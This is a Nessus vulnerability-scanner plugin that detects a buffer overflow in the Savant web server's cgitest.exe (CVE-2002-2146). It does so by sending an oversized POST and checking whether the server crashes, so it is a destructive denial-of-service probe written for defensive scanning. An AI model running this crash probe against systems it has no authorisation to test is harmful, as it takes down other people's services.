#
# (C) Tenable Network Security, Inc.
#

# References:
# 
# Date: Fri, 13 Sep 2002 19:55:05 +0000
# From "Auriemma Luigi" <aluigi@pivx.com>
# To: bugtraq@securityfocus.com
# Subject: Savant 3.1 multiple vulnerabilities

include("compat.inc");

if(description)
{
 script_id(11173);
 script_version("$Revision: 1.24 $");
 script_cve_id("CVE-2002-2146");
 script_bugtraq_id(5706);
 script_osvdb_id(16591);
 
 script_name(english:"Savant Web Server cgitest.exe Overflow");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is vulnerable to a buffer overflow attack." );
 script_set_attribute(attribute:"description", value:
"cgitest.exe from Savant web server is installed.  This CGI is
vulnerable to a buffer overflow which may allow a remote attacker to
crash the affected server or even run code on the remote host." );
 #https://web.archive.org/web/20040917153922/http://archives.neohapsis.com/archives/bugtraq/2002-09/0151.html
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?4b6c826b");
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2002/11/27");
 script_set_attribute(attribute:"vuln_publication_date", value: "2002/09/14");
 script_cvs_date("$Date: 2016/11/03 21:08:35 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
 script_summary(english:"Savant cgitest.exe buffer overflow");
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2002-2016 Tenable Network Security, Inc.");

 script_family(english:"CGI abuses");
 
 script_dependencie("find_service1.nasl", "http_version.nasl");
 script_require_ports("Services/www",80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 1);

banner = get_http_banner(port:port);
if (!banner) exit(1, "No HTTP banner on port "+port);
if ("Savant/" >!< banner) exit(0, "The web server on port "+port+" is not Savant");

foreach dir (cgi_dirs())
{
 p = string(dir, "/cgitest.exe");
 if (is_cgi_installed3(item:p, port:port))
 {
 len = 256;	# 136 should be enough
 w = http_send_recv3(method:"POST", item:p, port: port, data: crap(len));
 # if (isnull(w)) exit(1, "The web server on port "+port+" did not answer");

 sleep(1);

 if(http_is_dead(port: port))
 {
  security_hole(port);
  exit(0);
  } 
 }
}
